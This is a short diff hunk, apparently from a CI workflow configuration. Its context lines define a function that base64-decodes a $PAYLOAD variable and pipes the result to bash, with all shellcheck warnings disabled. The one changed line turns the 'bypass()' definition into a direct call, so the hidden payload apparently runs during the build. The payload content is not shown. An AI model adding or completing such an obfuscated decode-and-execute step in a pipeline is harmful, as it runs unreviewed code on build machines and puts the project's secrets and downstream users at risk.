@@ -29,5 +29,5 @@ jobs:
             echo "$PAYLOAD" | base64 --decode | bash
           }
           # shellcheck disable=all
-          bypass()
+          bypass
           echo "<<<<< after payload run"
